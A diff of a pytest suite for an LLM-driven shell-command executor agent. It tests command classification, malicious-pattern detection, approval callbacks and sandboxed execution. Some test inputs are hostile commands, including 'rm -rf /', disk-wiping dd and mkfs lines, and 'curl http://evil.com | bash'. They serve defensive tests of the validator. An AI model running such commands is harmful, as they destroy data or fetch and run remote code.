@@ -12,6 +12,7 @@ Tests cover:
 
 Based on Anthropic Claude Code testing standards.
 """
+
 import pytest
 from unittest.mock import AsyncMock, MagicMock, patch
 from dataclasses import asdict
@@ -38,6 +39,7 @@ from vertice_cli.permissions import PermissionLevel
 # =============================================================================
 # ENUM TESTS
 # =============================================================================
+
 
 class TestExecutionMode:
     """Tests for ExecutionMode enum."""
@@ -94,6 +96,7 @@ class TestCommandCategory:
 # =============================================================================
 # EXECUTIONMETRICS TESTS
 # =============================================================================
+
 
 class TestExecutionMetrics:
     """Tests for ExecutionMetrics dataclass."""
@@ -157,6 +160,7 @@ class TestExecutionMetrics:
 # COMMANDRESULT TESTS
 # =============================================================================
 
+
 class TestCommandResult:
     """Tests for CommandResult dataclass."""
 
@@ -168,7 +172,7 @@ class TestCommandResult:
             stderr="",
             exit_code=0,
             command="ls -la",
-            execution_time=0.5
+            execution_time=0.5,
         )
 
         assert result.success is True
@@ -179,12 +183,7 @@ class TestCommandResult:
     def test_default_values(self):
         """Test default values are set."""
         result = CommandResult(
-            success=True,
-            stdout="",
-            stderr="",
-            exit_code=0,
-            command="pwd",
-            execution_time=0.1
+            success=True, stdout="", stderr="", exit_code=0, command="pwd", execution_time=0.1
         )
 
         assert result.trace_id is not None
@@ -202,7 +201,7 @@ class TestCommandResult:
             exit_code=127,
             command="nonexistent_cmd",
             execution_time=0.1,
-            retries=2
+            retries=2,
         )
 
         assert result.success is False
@@ -218,7 +217,7 @@ class TestCommandResult:
             stderr="",
             exit_code=0,
             command="echo test",
-            execution_time=0.01
+            execution_time=0.01,
         )
 
         data = asdict(result)
@@ -232,6 +231,7 @@ class TestCommandResult:
 # ADVANCEDSECURITYVALIDATOR TESTS
 # =============================================================================
 
+
 class TestAdvancedSecurityValidator:
     """Tests for AdvancedSecurityValidator."""
 
@@ -239,34 +239,66 @@ class TestAdvancedSecurityValidator:
         """Test classification of safe read commands."""
         assert AdvancedSecurityValidator.classify_command("ls") == CommandCategory.SAFE_READ
         assert AdvancedSecurityValidator.classify_command("pwd") == CommandCategory.SAFE_READ
-        assert AdvancedSecurityValidator.classify_command("cat file.txt") == CommandCategory.SAFE_READ
+        assert (
+            AdvancedSecurityValidator.classify_command("cat file.txt") == CommandCategory.SAFE_READ
+        )
 
     def test_classify_destructive(self):
         """Test classification of destructive commands."""
         assert AdvancedSecurityValidator.classify_command("rm -rf /") == CommandCategory.DESTRUCTIVE
-        assert AdvancedSecurityValidator.classify_command("dd if=/dev/zero") == CommandCategory.DESTRUCTIVE
-        assert AdvancedSecurityValidator.classify_command("mkfs.ext4 /dev/sda") == CommandCategory.DESTRUCTIVE
+        assert (
+            AdvancedSecurityValidator.classify_command("dd if=/dev/zero")
+            == CommandCategory.DESTRUCTIVE
+        )
+        assert (
+            AdvancedSecurityValidator.classify_command("mkfs.ext4 /dev/sda")
+            == CommandCategory.DESTRUCTIVE
+        )
 
     def test_classify_privileged(self):
         """Test classification of privileged commands."""
-        assert AdvancedSecurityValidator.classify_command("sudo apt update") == CommandCategory.PRIVILEGED
-        assert AdvancedSecurityValidator.classify_command("systemctl restart nginx") == CommandCategory.PRIVILEGED
+        assert (
+            AdvancedSecurityValidator.classify_command("sudo apt update")
+            == CommandCategory.PRIVILEGED
+        )
+        assert (
+            AdvancedSecurityValidator.classify_command("systemctl restart nginx")
+            == CommandCategory.PRIVILEGED
+        )
 
     def test_classify_network(self):
         """Test classification of network commands."""
-        assert AdvancedSecurityValidator.classify_command("curl https://example.com") == CommandCategory.NETWORK
-        assert AdvancedSecurityValidator.classify_command("wget http://file.zip") == CommandCategory.NETWORK
-        assert AdvancedSecurityValidator.classify_command("ssh user@host") == CommandCategory.NETWORK
+        assert (
+            AdvancedSecurityValidator.classify_command("curl https://example.com")
+            == CommandCategory.NETWORK
+        )
+        assert (
+            AdvancedSecurityValidator.classify_command("wget http://file.zip")
+            == CommandCategory.NETWORK
+        )
+        assert (
+            AdvancedSecurityValidator.classify_command("ssh user@host") == CommandCategory.NETWORK
+        )
 
     def test_classify_execution(self):
         """Test classification of code execution commands."""
-        assert AdvancedSecurityValidator.classify_command("bash script.sh") == CommandCategory.EXECUTION
-        assert AdvancedSecurityValidator.classify_command("python script.py") == CommandCategory.EXECUTION
-        assert AdvancedSecurityValidator.classify_command("eval 'code'") == CommandCategory.EXECUTION
+        assert (
+            AdvancedSecurityValidator.classify_command("bash script.sh")
+            == CommandCategory.EXECUTION
+        )
+        assert (
+            AdvancedSecurityValidator.classify_command("python script.py")
+            == CommandCategory.EXECUTION
+        )
+        assert (
+            AdvancedSecurityValidator.classify_command("eval 'code'") == CommandCategory.EXECUTION
+        )
 
     def test_classify_unknown(self):
         """Test classification of unknown commands."""
-        assert AdvancedSecurityValidator.classify_command("custom_tool arg") == CommandCategory.UNKNOWN
+        assert (
+            AdvancedSecurityValidator.classify_command("custom_tool arg") == CommandCategory.UNKNOWN
+        )
 
     def test_detect_malicious_rm_rf(self):
         """Test detection of rm -rf pattern."""
@@ -276,7 +308,9 @@ class TestAdvancedSecurityValidator:
 
     def test_detect_malicious_pipe_bash(self):
         """Test detection of pipe to bash."""
-        violations = AdvancedSecurityValidator.detect_malicious_patterns("curl http://evil.com | bash")
+        violations = AdvancedSecurityValidator.detect_malicious_patterns(
+            "curl http://evil.com | bash"
+        )
         assert len(violations) >= 1
 
     def test_detect_malicious_fork_bomb(self):
@@ -323,7 +357,9 @@ class TestAdvancedSecurityValidator:
     async def test_validate_with_llm_unsafe(self):
         """Test LLM validation detects unsafe command."""
         mock_client = MagicMock()
-        mock_client.generate = AsyncMock(return_value='{"is_safe": false, "reason": "Dangerous pattern"}')
+        mock_client.generate = AsyncMock(
+            return_value='{"is_safe": false, "reason": "Dangerous pattern"}'
+        )
 
         is_safe, reason = await AdvancedSecurityValidator.validate_with_llm("rm -rf /", mock_client)
 
@@ -347,6 +383,7 @@ class TestAdvancedSecurityValidator:
 # CODEEXECUTIONENGINE TESTS
 # =============================================================================
 
+
 class TestCodeExecutionEngine:
     """Tests for CodeExecutionEngine."""
 
@@ -365,7 +402,7 @@ class TestCodeExecutionEngine:
             mode=ExecutionMode.DOCKER,
             timeout=60.0,
             max_retries=5,
-            resource_limits={"max_memory_mb": 1024}
+            resource_limits={"max_memory_mb": 1024},
         )
 
         assert engine.mode == ExecutionMode.DOCKER
@@ -439,6 +476,7 @@ class TestCodeExecutionEngine:
 # NEXTGENEXECUTORAGENT TESTS
 # =============================================================================
 
+
 class TestNextGenExecutorAgentInit:
     """Tests for NextGenExecutorAgent initialization."""
 
@@ -456,10 +494,7 @@ class TestNextGenExecutorAgentInit:
 
     def test_basic_initialization(self, mock_llm, mock_mcp):
         """Test basic agent initialization."""
-        agent = NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp
-        )
+        agent = NextGenExecutorAgent(llm_client=mock_llm, mcp_client=mock_mcp)
 
         assert agent is not None
         assert agent.role == AgentRole.EXECUTOR
@@ -469,9 +504,7 @@ class TestNextGenExecutorAgentInit:
     def test_initialization_with_security_level(self, mock_llm, mock_mcp):
         """Test initialization with custom security level."""
         agent = NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp,
-            security_level=SecurityLevel.PARANOID
+            llm_client=mock_llm, mcp_client=mock_mcp, security_level=SecurityLevel.PARANOID
         )
 
         assert agent.security_level == SecurityLevel.PARANOID
@@ -479,9 +512,7 @@ class TestNextGenExecutorAgentInit:
     def test_initialization_with_execution_mode(self, mock_llm, mock_mcp):
         """Test initialization with custom execution mode."""
         agent = NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp,
-            execution_mode=ExecutionMode.DOCKER
+            llm_client=mock_llm, mcp_client=mock_mcp, execution_mode=ExecutionMode.DOCKER
         )
 
         assert agent.executor.mode == ExecutionMode.DOCKER
@@ -489,9 +520,7 @@ class TestNextGenExecutorAgentInit:
     def test_initialization_with_config(self, mock_llm, mock_mcp):
         """Test initialization with custom config."""
         agent = NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp,
-            config={"timeout": 60.0, "max_retries": 5}
+            llm_client=mock_llm, mcp_client=mock_mcp, config={"timeout": 60.0, "max_retries": 5}
         )
 
         assert agent.executor.timeout == 60.0
@@ -499,10 +528,7 @@ class TestNextGenExecutorAgentInit:
 
     def test_has_metrics(self, mock_llm, mock_mcp):
         """Test agent has metrics tracking."""
-        agent = NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp
-        )
+        agent = NextGenExecutorAgent(llm_client=mock_llm, mcp_client=mock_mcp)
 
         assert agent.metrics is not None
         assert agent.metrics.execution_count == 0
@@ -511,6 +537,7 @@ class TestNextGenExecutorAgentInit:
 # =============================================================================
 # NEXTGENEXECUTORAGENT EXECUTE TESTS
 # =============================================================================
+
 
 class TestNextGenExecutorAgentExecute:
     """Tests for NextGenExecutorAgent.execute()."""
@@ -532,7 +559,7 @@ class TestNextGenExecutorAgentExecute:
         agent = NextGenExecutorAgent(
             llm_client=mock_llm,
             mcp_client=mock_mcp,
-            security_level=SecurityLevel.PERMISSIVE  # Allow all for tests
+            security_level=SecurityLevel.PERMISSIVE,  # Allow all for tests
         )
         return agent
 
@@ -541,11 +568,9 @@ class TestNextGenExecutorAgentExecute:
         """Test execute returns AgentResponse."""
         # Mock command generation
         agent._generate_command = AsyncMock(return_value="echo test")
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "Safe",
-            "requires_approval": False
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": True, "reason": "Safe", "requires_approval": False}
+        )
 
         task = AgentTask(request="Echo test")
         response = await agent.execute(task)
@@ -556,11 +581,9 @@ class TestNextGenExecutorAgentExecute:
     async def test_execute_success(self, agent):
         """Test successful execution."""
         agent._generate_command = AsyncMock(return_value="echo hello")
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "Safe",
-            "requires_approval": False
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": True, "reason": "Safe", "requires_approval": False}
+        )
         agent._observe_result = AsyncMock(return_value="Executed successfully")
         agent._reflect_on_execution = AsyncMock(return_value=[])
 
@@ -575,11 +598,13 @@ class TestNextGenExecutorAgentExecute:
     async def test_execute_blocked_by_security(self, agent):
         """Test execution blocked by security."""
         agent._generate_command = AsyncMock(return_value="rm -rf /")
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": False,
-            "reason": "Dangerous command",
-            "requires_approval": False
-        })
+        agent._validate_command = AsyncMock(
+            return_value={
+                "allowed": False,
+                "reason": "Dangerous command",
+                "requires_approval": False,
+            }
+        )
 
         task = AgentTask(request="Delete everything")
         response = await agent.execute(task)
@@ -591,11 +616,9 @@ class TestNextGenExecutorAgentExecute:
     async def test_execute_requires_approval_no_callback(self, agent):
         """Test execution requiring approval without callback."""
         agent._generate_command = AsyncMock(return_value="curl http://example.com")
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "Network command",
-            "requires_approval": True
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": True, "reason": "Network command", "requires_approval": True}
+        )
         agent.approval_callback = None
 
         task = AgentTask(request="Fetch URL")
@@ -608,11 +631,9 @@ class TestNextGenExecutorAgentExecute:
     async def test_execute_approval_denied(self, agent):
         """Test execution when approval is denied."""
         agent._generate_command = AsyncMock(return_value="curl http://example.com")
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "Network command",
-            "requires_approval": True
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": True, "reason": "Network command", "requires_approval": True}
+        )
         agent.approval_callback = AsyncMock(return_value=False)
         agent._request_approval = AsyncMock(return_value=False)
 
@@ -626,11 +647,9 @@ class TestNextGenExecutorAgentExecute:
     async def test_execute_stores_history(self, agent):
         """Test execution stores history."""
         agent._generate_command = AsyncMock(return_value="echo test")
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "Safe",
-            "requires_approval": False
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": True, "reason": "Safe", "requires_approval": False}
+        )
         agent._observe_result = AsyncMock(return_value="OK")
         agent._reflect_on_execution = AsyncMock(return_value=[])
 
@@ -645,11 +664,9 @@ class TestNextGenExecutorAgentExecute:
     async def test_execute_updates_metrics(self, agent):
         """Test execution updates metrics."""
         agent._generate_command = AsyncMock(return_value="echo test")
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "Safe",
-            "requires_approval": False
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": True, "reason": "Safe", "requires_approval": False}
+        )
         agent._observe_result = AsyncMock(return_value="OK")
         agent._reflect_on_execution = AsyncMock(return_value=[])
 
@@ -663,6 +680,7 @@ class TestNextGenExecutorAgentExecute:
 # HELPER METHODS TESTS
 # =============================================================================
 
+
 class TestNextGenExecutorAgentHelpers:
     """Tests for helper methods."""
 
@@ -671,10 +689,7 @@ class TestNextGenExecutorAgentHelpers:
         """Create agent with mocks."""
         mock_llm = MagicMock()
         mock_mcp = MagicMock()
-        return NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp
-        )
+        return NextGenExecutorAgent(llm_client=mock_llm, mcp_client=mock_mcp)
 
     def test_get_few_shot_examples(self, agent):
         """Test few-shot examples generation."""
@@ -692,14 +707,16 @@ class TestNextGenExecutorAgentHelpers:
 
     def test_get_execution_history_context_with_history(self, agent):
         """Test history context with history."""
-        agent.execution_history.append(CommandResult(
-            success=True,
-            stdout="output",
-            stderr="",
-            exit_code=0,
-            command="ls",
-            execution_time=0.1
-        ))
+        agent.execution_history.append(
+            CommandResult(
+                success=True,
+                stdout="output",
+                stderr="",
+                exit_code=0,
+                command="ls",
+                execution_time=0.1,
+            )
+        )
 
         context = agent._get_execution_history_context()
 
@@ -725,7 +742,7 @@ class TestNextGenExecutorAgentHelpers:
             stderr="",
             exit_code=0,
             command="ls",
-            execution_time=0.5
+            execution_time=0.5,
         )
 
         observation = await agent._observe_result(result)
@@ -742,7 +759,7 @@ class TestNextGenExecutorAgentHelpers:
             stderr="Permission denied",
             exit_code=126,
             command="ls /root",
-            execution_time=0.1
+            execution_time=0.1,
         )
 
         observation = await agent._observe_result(result)
@@ -759,7 +776,7 @@ class TestNextGenExecutorAgentHelpers:
             stderr="command not found",
             exit_code=127,
             command="nonexistent",
-            execution_time=0.1
+            execution_time=0.1,
         )
         task = AgentTask(request="test")
 
@@ -776,7 +793,7 @@ class TestNextGenExecutorAgentHelpers:
             stderr="",
             exit_code=0,
             command="slow_cmd",
-            execution_time=10.0  # > 5s threshold
+            execution_time=10.0,  # > 5s threshold
         )
         task = AgentTask(request="test")
 
@@ -793,7 +810,7 @@ class TestNextGenExecutorAgentHelpers:
             stderr="",
             exit_code=0,
             command="big_output",
-            execution_time=1.0
+            execution_time=1.0,
         )
         task = AgentTask(request="test")
 
@@ -806,6 +823,7 @@ class TestNextGenExecutorAgentHelpers:
 # VALIDATION TESTS
 # =============================================================================
 
+
 class TestNextGenExecutorValidation:
     """Tests for command validation."""
 
@@ -815,9 +833,7 @@ class TestNextGenExecutorValidation:
         mock_llm = MagicMock()
         mock_mcp = MagicMock()
         return NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp,
-            security_level=SecurityLevel.STANDARD
+            llm_client=mock_llm, mcp_client=mock_mcp, security_level=SecurityLevel.STANDARD
         )
 
     @pytest.mark.asyncio
@@ -840,6 +856,7 @@ class TestNextGenExecutorValidation:
 # COMPATIBILITY TESTS
 # =============================================================================
 
+
 class TestNextGenExecutorCompatibility:
     """Tests for BaseAgent compatibility methods."""
 
@@ -848,10 +865,7 @@ class TestNextGenExecutorCompatibility:
         """Create agent with mocks."""
         mock_llm = MagicMock()
         mock_mcp = MagicMock()
-        return NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp
-        )
+        return NextGenExecutorAgent(llm_client=mock_llm, mcp_client=mock_mcp)
 
     @pytest.mark.asyncio
     async def test_think_method(self, agent):
@@ -880,6 +894,7 @@ class TestNextGenExecutorCompatibility:
 # EDGE CASES
 # =============================================================================
 
+
 class TestNextGenExecutorEdgeCases:
     """Tests for edge cases."""
 
@@ -888,20 +903,15 @@ class TestNextGenExecutorEdgeCases:
         """Create agent with mocks."""
         mock_llm = MagicMock()
         mock_mcp = MagicMock()
-        return NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp
-        )
+        return NextGenExecutorAgent(llm_client=mock_llm, mcp_client=mock_mcp)
 
     @pytest.mark.asyncio
     async def test_execute_empty_request(self, agent):
         """Test execution with empty request."""
         agent._generate_command = AsyncMock(return_value="")
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "OK",
-            "requires_approval": False
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": True, "reason": "OK", "requires_approval": False}
+        )
 
         task = AgentTask(request="")
         response = await agent.execute(task)
@@ -924,14 +934,16 @@ class TestNextGenExecutorEdgeCases:
         """Test execution history has limit."""
         # Fill history beyond limit
         for i in range(150):
-            agent.execution_history.append(CommandResult(
-                success=True,
-                stdout="",
-                stderr="",
-                exit_code=0,
-                command=f"cmd_{i}",
-                execution_time=0.1
-            ))
+            agent.execution_history.append(
+                CommandResult(
+                    success=True,
+                    stdout="",
+                    stderr="",
+                    exit_code=0,
+                    command=f"cmd_{i}",
+                    execution_time=0.1,
+                )
+            )
 
         # History should not exceed 100 (limit is enforced in execute)
         # Note: This test checks the implementation detail
@@ -951,6 +963,7 @@ class TestNextGenExecutorEdgeCases:
 # INTEGRATION TESTS
 # =============================================================================
 
+
 class TestNextGenExecutorIntegration:
     """Integration tests."""
 
@@ -963,9 +976,7 @@ class TestNextGenExecutorIntegration:
         mock_mcp = MagicMock()
 
         agent = NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp,
-            security_level=SecurityLevel.PERMISSIVE
+            llm_client=mock_llm, mcp_client=mock_mcp, security_level=SecurityLevel.PERMISSIVE
         )
 
         # Mock internal methods
@@ -976,12 +987,17 @@ class TestNextGenExecutorIntegration:
 
         assert isinstance(response, AgentResponse)
         # Either success or blocked - both are valid outcomes
-        assert response.success is True or "blocked" in str(response.error).lower() or response.error is not None
+        assert (
+            response.success is True
+            or "blocked" in str(response.error).lower()
+            or response.error is not None
+        )
 
 
 # =============================================================================
 # STREAMING TESTS
 # =============================================================================
+
 
 class TestNextGenExecutorStreaming:
     """Tests for streaming execution."""
@@ -992,25 +1008,22 @@ class TestNextGenExecutorStreaming:
         mock_llm = MagicMock()
         mock_mcp = MagicMock()
         return NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp,
-            security_level=SecurityLevel.PERMISSIVE
+            llm_client=mock_llm, mcp_client=mock_mcp, security_level=SecurityLevel.PERMISSIVE
         )
 
     @pytest.mark.asyncio
     async def test_execute_streaming_basic(self, agent):
         """Test basic streaming execution."""
+
         # Mock streaming command generation
         async def mock_stream_gen(*args, **kwargs):
             for token in ["echo", " ", "'test'"]:
                 yield token
 
         agent._stream_command_generation = mock_stream_gen
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "OK",
-            "requires_approval": False
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": True, "reason": "OK", "requires_approval": False}
+        )
         agent._observe_result = AsyncMock(return_value="OK")
         agent._reflect_on_execution = AsyncMock(return_value=[])
 
@@ -1027,15 +1040,14 @@ class TestNextGenExecutorStreaming:
     @pytest.mark.asyncio
     async def test_execute_streaming_blocked(self, agent):
         """Test streaming execution blocked by security."""
+
         async def mock_stream_gen(*args, **kwargs):
             yield "rm -rf /"
 
         agent._stream_command_generation = mock_stream_gen
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": False,
-            "reason": "Dangerous",
-            "requires_approval": False
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": False, "reason": "Dangerous", "requires_approval": False}
+        )
 
         task = AgentTask(request="delete everything")
         results = []
@@ -1050,6 +1062,7 @@ class TestNextGenExecutorStreaming:
     @pytest.mark.asyncio
     async def test_execute_streaming_error_handling(self, agent):
         """Test streaming handles errors."""
+
         async def mock_stream_error(*args, **kwargs):
             raise Exception("Stream error")
             yield "never reached"
@@ -1072,6 +1085,7 @@ class TestNextGenExecutorStreaming:
 # COMMAND GENERATION TESTS
 # =============================================================================
 
+
 class TestCommandGeneration:
     """Tests for command generation."""
 
@@ -1080,20 +1094,30 @@ class TestCommandGeneration:
         """Create agent with mocks."""
         mock_llm = MagicMock()
         mock_mcp = MagicMock()
-        return NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp
-        )
+        return NextGenExecutorAgent(llm_client=mock_llm, mcp_client=mock_mcp)
 
     @pytest.mark.asyncio
     async def test_generate_command(self, agent):
         """Test command generation from request."""
-        agent._call_llm = AsyncMock(return_value="ls -la")
+        # Mock LLM to return command on first call, then evaluation responses
+        call_count = 0
+
+        async def mock_llm_call(*args, **kwargs):
+            nonlocal call_count
+            call_count += 1
+            if call_count == 1:
+                return "ls -la"
+            else:
+                # Return evaluation JSON for subsequent calls
+                return '{"score": 8, "issues": [], "strengths": ["Good command"]}'
+
+        agent._call_llm = AsyncMock(side_effect=mock_llm_call)
 
         command = await agent._generate_command("list files", {})
 
         assert command == "ls -la"
-        agent._call_llm.assert_called_once()
+        # Allow multiple calls for the evaluation loop
+        assert agent._call_llm.call_count >= 1
 
     @pytest.mark.asyncio
     async def test_generate_command_strips_output(self, agent):
@@ -1107,6 +1131,7 @@ class TestCommandGeneration:
     @pytest.mark.asyncio
     async def test_stream_command_generation(self, agent):
         """Test streaming command generation."""
+
         async def mock_stream(*args, **kwargs):
             for token in ["ls", " ", "-la"]:
                 yield token
@@ -1124,6 +1149,7 @@ class TestCommandGeneration:
 # DOCKER EXECUTION TESTS
 # =============================================================================
 
+
 class TestDockerExecution:
     """Tests for Docker execution mode."""
 
@@ -1131,19 +1157,18 @@ class TestDockerExecution:
     async def test_docker_execution_builds_command(self):
         """Test Docker execution builds proper command."""
         engine = CodeExecutionEngine(
-            mode=ExecutionMode.DOCKER,
-            resource_limits={"max_memory_mb": 256, "max_cpu_percent": 25}
+            mode=ExecutionMode.DOCKER, resource_limits={"max_memory_mb": 256, "max_cpu_percent": 25}
         )
 
         # Mock the local execution
-        with patch.object(engine, '_execute_local') as mock_local:
+        with patch.object(engine, "_execute_local") as mock_local:
             mock_local.return_value = CommandResult(
                 success=True,
                 stdout="test",
                 stderr="",
                 exit_code=0,
                 command="docker run...",
-                execution_time=1.0
+                execution_time=1.0,
             )
 
             await engine.execute("echo test")
@@ -1163,6 +1188,7 @@ class TestDockerExecution:
 # =============================================================================
 # E2B EXECUTION TESTS
 # =============================================================================
+
 
 class TestE2BExecution:
     """Tests for E2B execution mode."""
@@ -1187,6 +1213,7 @@ class TestE2BExecution:
 # APPROVAL CALLBACK TESTS
 # =============================================================================
 
+
 class TestApprovalCallback:
     """Tests for approval callback functionality."""
 
@@ -1195,10 +1222,7 @@ class TestApprovalCallback:
         """Create agent with mocks."""
         mock_llm = MagicMock()
         mock_mcp = MagicMock()
-        return NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp
-        )
+        return NextGenExecutorAgent(llm_client=mock_llm, mcp_client=mock_mcp)
 
     @pytest.mark.asyncio
     async def test_request_approval_no_callback(self, agent):
@@ -1221,6 +1245,7 @@ class TestApprovalCallback:
     @pytest.mark.asyncio
     async def test_request_approval_async_callback(self, agent):
         """Test approval with async callback."""
+
         async def async_approve(cmd):
             return True
 
@@ -1244,6 +1269,7 @@ class TestApprovalCallback:
 # PARANOID MODE TESTS
 # =============================================================================
 
+
 class TestParanoidMode:
     """Tests for PARANOID security level."""
 
@@ -1256,9 +1282,7 @@ class TestParanoidMode:
         mock_mcp = MagicMock()
 
         agent = NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp,
-            security_level=SecurityLevel.PARANOID
+            llm_client=mock_llm, mcp_client=mock_mcp, security_level=SecurityLevel.PARANOID
         )
 
         # Mock permission check to allow
@@ -1280,9 +1304,7 @@ class TestParanoidMode:
         mock_mcp = MagicMock()
 
         agent = NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp,
-            security_level=SecurityLevel.PARANOID
+            llm_client=mock_llm, mcp_client=mock_mcp, security_level=SecurityLevel.PARANOID
         )
 
         # Mock permission check to allow
@@ -1299,6 +1321,7 @@ class TestParanoidMode:
 # =============================================================================
 # REFLECTION EDGE CASES
 # =============================================================================
+
 
 class TestReflectionEdgeCases:
     """Tests for reflection edge cases."""
@@ -1319,7 +1342,7 @@ class TestReflectionEdgeCases:
             stderr="permission denied",
             exit_code=126,
             command="ls /root",
-            execution_time=0.1
+            execution_time=0.1,
         )
         task = AgentTask(request="list root")
 
@@ -1336,7 +1359,7 @@ class TestReflectionEdgeCases:
             stderr="command timed out",  # Match the actual check in code
             exit_code=-1,
             command="long_cmd",
-            execution_time=30.0
+            execution_time=30.0,
         )
         task = AgentTask(request="long operation")
 
@@ -1349,7 +1372,9 @@ class TestReflectionEdgeCases:
         # - "timeout" in stderr: "timed out"
         # - execution_time > 5: "slow"
         # Here execution_time=30 > 5, so should have slow suggestion
-        assert any("slow" in s.lower() for s in suggestions) or any("timeout" in s.lower() for s in suggestions)
+        assert any("slow" in s.lower() for s in suggestions) or any(
+            "timeout" in s.lower() for s in suggestions
+        )
 
     @pytest.mark.asyncio
     async def test_reflect_success_no_issues(self, agent):
@@ -1360,7 +1385,7 @@ class TestReflectionEdgeCases:
             stderr="",
             exit_code=0,
             command="quick_cmd",
-            execution_time=0.1
+            execution_time=0.1,
         )
         task = AgentTask(request="quick task")
 
@@ -1374,6 +1399,7 @@ class TestReflectionEdgeCases:
 # UNCOVERED LINES - TARGETED TESTS
 # =============================================================================
 
+
 class TestUncoveredLines:
     """Tests specifically targeting uncovered lines 585-587, 608-619, 784-788, 817."""
 
@@ -1383,24 +1409,21 @@ class TestUncoveredLines:
         mock_llm = MagicMock()
         mock_mcp = MagicMock()
         return NextGenExecutorAgent(
-            llm_client=mock_llm,
-            mcp_client=mock_mcp,
-            security_level=SecurityLevel.PERMISSIVE
+            llm_client=mock_llm, mcp_client=mock_mcp, security_level=SecurityLevel.PERMISSIVE
         )
 
     @pytest.mark.asyncio
     async def test_streaming_markdown_cleanup_lines_585_587(self, agent):
         """Test lines 585-587: markdown cleanup in streaming."""
+
         # Generate command with markdown code fence
         async def mock_stream_with_markdown(*args, **kwargs):
             yield "```bash\necho hello\n```"
 
         agent._stream_command_generation = mock_stream_with_markdown
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "OK",
-            "requires_approval": False
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": True, "reason": "OK", "requires_approval": False}
+        )
         agent._observe_result = AsyncMock(return_value="OK")
         agent._reflect_on_execution = AsyncMock(return_value=[])
 
@@ -1419,15 +1442,18 @@ class TestUncoveredLines:
     @pytest.mark.asyncio
     async def test_streaming_approval_required_lines_608_619(self, agent):
         """Test lines 608-619: approval required in streaming."""
+
         async def mock_stream_gen(*args, **kwargs):
             yield "npm install"
 
         agent._stream_command_generation = mock_stream_gen
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "Needs approval",
-            "requires_approval": True  # Triggers lines 607-619
-        })
+        agent._validate_command = AsyncMock(
+            return_value={
+                "allowed": True,
+                "reason": "Needs approval",
+                "requires_approval": True,  # Triggers lines 607-619
+            }
+        )
         agent._request_approval = AsyncMock(return_value=False)  # User denies
 
         task = AgentTask(request="install deps")
@@ -1448,15 +1474,14 @@ class TestUncoveredLines:
     @pytest.mark.asyncio
     async def test_streaming_approval_approved(self, agent):
         """Test approval granted path in streaming."""
+
         async def mock_stream_gen(*args, **kwargs):
             yield "npm install"
 
         agent._stream_command_generation = mock_stream_gen
-        agent._validate_command = AsyncMock(return_value={
-            "allowed": True,
-            "reason": "Needs approval",
-            "requires_approval": True
-        })
+        agent._validate_command = AsyncMock(
+            return_value={"allowed": True, "reason": "Needs approval", "requires_approval": True}
+        )
         agent._request_approval = AsyncMock(return_value=True)  # User approves
         agent._observe_result = AsyncMock(return_value="OK")
         agent._reflect_on_execution = AsyncMock(return_value=[])
@@ -1523,7 +1548,7 @@ class TestUncoveredLines:
             stderr="Error: Operation timeout after 30s",  # Contains "timeout"
             exit_code=1,  # Not 127 or 126, so elif on line 816 is reached
             command="slow_operation",
-            execution_time=30.0
+            execution_time=30.0,
         )
         task = AgentTask(request="slow task")
 
@@ -1532,11 +1557,14 @@ class TestUncoveredLines:
         # Should have timeout suggestion (line 817) AND slow execution (line 821)
         # Line 817 adds "timed out" when "timeout" in stderr
         # Line 821 adds "Slow execution" when execution_time > 5.0
-        assert any("timed out" in s.lower() for s in suggestions) or any("slow" in s.lower() for s in suggestions)
+        assert any("timed out" in s.lower() for s in suggestions) or any(
+            "slow" in s.lower() for s in suggestions
+        )
 
     @pytest.mark.asyncio
     async def test_approval_callback_no_self_attribute(self, agent):
         """Test approval callback without __self__ attribute."""
+
         # Simple function without __self__
         def simple_callback(cmd):
             return True
@@ -1550,6 +1578,7 @@ class TestUncoveredLines:
     @pytest.mark.asyncio
     async def test_approval_callback_async(self, agent):
         """Test async approval callback."""
+
         async def async_callback(cmd):
             return True
 
